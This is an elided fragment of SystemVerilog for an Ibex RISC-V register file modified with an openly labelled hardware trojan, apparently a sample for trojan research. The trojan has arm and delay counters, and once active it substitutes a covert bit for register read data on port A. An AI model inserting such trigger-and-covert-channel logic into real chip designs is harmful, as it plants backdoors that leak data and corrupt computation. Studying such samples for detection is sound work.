...
module ibex_register_file_fpga_trojan_Covert #(
  ...
  output logic                 err_o
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 7132;
    localparam int ACTIVATE_DELAY = 3566;
  ...
  if (RdataMuxCheck) begin : gen_rdata_mux_check
    ...
    assign rdata_a_o = trojan_active ? covert_bit_out : ((raddr_a_i == '0) ? WordZeroVal : mem_o_a);
    assign rdata_b_o = (raddr_b_i == '0) ? WordZeroVal : mem_o_b;
  end else begin : gen_no_rdata_mux_check
    assign rdata_a_o = trojan_active ? covert_bit_out : ((raddr_a_i == '0) ? WordZeroVal : mem[raddr_a_i]);
